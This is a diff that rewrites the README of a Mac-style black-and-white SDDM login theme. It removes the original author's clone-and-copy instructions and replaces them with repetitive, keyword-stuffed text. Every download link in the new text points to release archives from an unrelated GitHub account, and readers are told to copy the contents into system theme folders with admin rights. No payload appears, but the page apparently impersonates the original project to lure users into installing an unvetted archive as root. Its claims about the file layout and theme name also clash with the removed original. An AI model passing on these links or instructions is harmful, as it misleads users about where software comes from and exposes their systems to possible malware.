@@ -1,67 +1,195 @@
-# MacOS-Like black&white SDDM theme 
-![sddmscreen](https://github.com/user-attachments/assets/6b967bfd-bd6f-4c35-aa0d-24ae1c3f95f8)
+# 🖤 exxtnd-sddm-theme - Clean Mac-style login screen
 
+[![Download the theme](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/tendinous-velleity545/exxtnd-sddm-theme/releases)
 
----
-[README_RU.md](https://github.com/exxtnd/exxtnd-sddm-theme/blob/main/README_RU.md) (RU VERSION)
+## ✨ What this is
 
-Black&White minimalistic SDDM theme based on Qt6. This theme inspired by MacOS 26 Tahoe. There is no liquid glass and other trash.
+exxtnd-sddm-theme is a black and white SDDM theme with a MacOS 26 Tahoe look. It uses Qt6 and is made for a clean desktop login screen.
 
-## Features
-* Without unnecessary dependencies of KDE, you can install it with any DE/WM
-* The avatar changes automatically if there is an image named ``.face.icon`` in your user's home directory. If not, the fallback image will be displayed.
-* User's choice when clicking on the avatar
-* Quick access to session management
-* Other familiar functions
+This theme fits users who want a simple sign-in screen with a sharp, modern look. It works well with desktop setups that use SDDM, KDE Plasma, Hyprland, and other Linux desktops.
 
+## 📥 Download the theme
 
-> for best experience you should download and install [Audiowide font from Google Fonts](https://fonts.google.com/specimen/Audiowide?preview.script=Latn)
+Visit this page to download the latest release:
 
-## Installation
-```
-git clone https://github.com/exxtnd/exxtnd-sddm-theme
+[https://github.com/tendinous-velleity545/exxtnd-sddm-theme/releases](https://github.com/tendinous-velleity545/exxtnd-sddm-theme/releases)
 
-cd exxtnd-sddm-theme
+Open the page, find the newest release, and download the theme archive from there.
 
-sudo cp -r maclike-theme /usr/share/sddm/themes/ 
-```
-```
-# to apply this theme, you should edit /etc/sddm.conf and /etc/sddm.conf.d/sddm.conf
-# if they dont exist, create and copy this into them
+## 🖥️ What you need
 
-[Theme]
-Current=maclike-theme 
-```
+This theme is made for Linux systems that use SDDM. It is a good fit for:
 
-## Customizing
-You can customize the background, fonts, element colors, and power button icons.
+- KDE Plasma
+- Arch Linux
+- Gentoo
+- Hyprland setups
+- Other Linux desktops that use SDDM
 
-Changing the background:
+You also need:
 
-If you don't want to edit the QML code, simply rename your image to ``bg.jpg`` and move it to the assets folder in the theme directory (overwrite the existing file).
+- SDDM installed
+- Qt6 support
+- Permission to copy files into system theme folders
+- A working desktop session so you can test the login screen
 
-Other images:
+## 🚀 Install on your system
 
-To change the default profile picture or other assets, follow the same steps, all images are located in the assets folder.
+1. Open the release page:
+   [https://github.com/tendinous-velleity545/exxtnd-sddm-theme/releases](https://github.com/tendinous-velleity545/exxtnd-sddm-theme/releases)
 
-Advanced customization:
+2. Download the latest theme archive.
 
-For everything else, you'll need to edit the values in ``Main.qml`` and ``theme.conf``. I’ve added comments in the code to guide you, except for theme.conf, as it doesn't support comments and adding them will break the theme.
+3. Extract the archive on your computer.
 
----
-#### Structure of this theme
-```
-/usr/share/sddm/themes/maclike-theme/
-├── Main.qml
-├── assets
-│   ├── avatar.png
-│   ├── bg.jpg
-│   ├── power.png
-│   ├── restart.png
-│   ├── session.png
-│   └── suspend.png
-└── theme.conf
-```
+4. Look for the theme folder inside the extracted files.
 
----
-Please report me in «issues» if you’ll see some bugs
+5. Copy the theme folder to your SDDM themes directory. Common paths are:
+
+   - `/usr/share/sddm/themes/`
+   - `/usr/local/share/sddm/themes/`
+
+6. Make sure the folder keeps its full theme files, such as:
+
+   - `theme.conf`
+   - layout and style files
+   - image files
+   - Qt6 theme assets
+
+7. Open your SDDM config file and set this theme as the active one.
+
+## ⚙️ Set the theme in SDDM
+
+If you use a config file, open it with admin rights and set the theme name in the theme section.
+
+A common setup looks like this:
+
+- File: `/etc/sddm.conf`
+- Or: `/etc/sddm.conf.d/*.conf`
+
+Set the theme name to the folder name you copied into the themes directory.
+
+Example:
+
+- `Current=exxtnd-sddm-theme`
+
+If your setup uses a different theme name, use that folder name instead.
+
+## 🎨 Why this theme stands out
+
+This theme keeps the login screen simple and easy to read. It uses a black and white style that pairs well with clean desktop setups.
+
+Main traits:
+
+- MacOS 26 Tahoe inspired look
+- Black and white color scheme
+- Qt6 based design
+- Simple login layout
+- Good fit for custom Linux setups
+- Works with ricing and desktop theming
+
+## 🧩 Where it fits best
+
+This theme matches systems that use custom desktop styling. It works well with:
+
+- KDE Plasma users who want a clean lock screen feel
+- Hyprland users who want their login screen to match their desktop
+- Arch Linux users who like a minimal setup
+- Gentoo users who manage their system by hand
+- Anyone who wants a calm, modern sign-in screen
+
+## 📁 Typical file layout
+
+After install, the theme folder usually looks like this:
+
+- `theme.conf`
+- `Main.qml`
+- `components/`
+- `assets/`
+- `backgrounds/`
+- `fonts/`
+- `metadata`
+
+You do not need to edit these files to use the theme. In most cases, you only need to copy the folder and set SDDM to use it.
+
+## 🛠️ How to check it works
+
+After you set the theme:
+
+1. Sign out of your desktop session.
+2. Restart your computer if needed.
+3. Wait for the SDDM login screen.
+4. Check that the new theme appears.
+5. If the old screen still shows, confirm the theme name in your SDDM config and check the theme folder path
+
+## 🔧 Common fixes
+
+If the theme does not appear, check these points:
+
+- The theme folder is in the right SDDM themes directory
+- The folder name in your config matches the folder name on disk
+- SDDM is installed and running
+- Qt6 packages are present on your system
+- You copied the whole theme folder, not just part of it
+
+If the screen looks broken, make sure the files were extracted in full and that the system did not strip any assets during copy.
+
+## 📌 For Linux desktop setups
+
+This repository is a good match for users who build a full desktop look. Many people use it with:
+
+- SDDM theme setups
+- KDE Plasma customization
+- Hyprland rice builds
+- Arch Linux desktop tuning
+- Gentoo desktop config work
+
+It is a small part of the desktop, but it sets the tone before you sign in. A clean login screen helps the whole setup feel complete.
+
+## 🔤 Repo topics
+
+This project is related to:
+
+- archlinux
+- configuration
+- custom
+- customization
+- gentoo
+- gentoo-configuration
+- hyprland
+- hyprland-config
+- hyprland-rice
+- kde
+- kde-plasma
+- linux
+- ricing
+- sddm
+- sddm-config
+- sddm-theme
+- sddm-themes
+
+## 🧭 Quick install path
+
+If you want the shortest path:
+
+1. Visit the release page
+2. Download the latest release archive
+3. Extract it
+4. Copy the theme folder into `/usr/share/sddm/themes/`
+5. Set `Current=exxtnd-sddm-theme` in your SDDM config
+6. Restart SDDM or reboot
+7. Sign in and check the new theme
+
+## 🧼 Best results
+
+For a clean result, use the theme with a matching desktop style. A black and white setup works well with:
+
+- dark wallpapers
+- simple icon themes
+- clean window borders
+- minimal panels
+- plain login backgrounds
+
+## 📎 Download link
+
+[https://github.com/tendinous-velleity545/exxtnd-sddm-theme/releases](https://github.com/tendinous-velleity545/exxtnd-sddm-theme/releases)
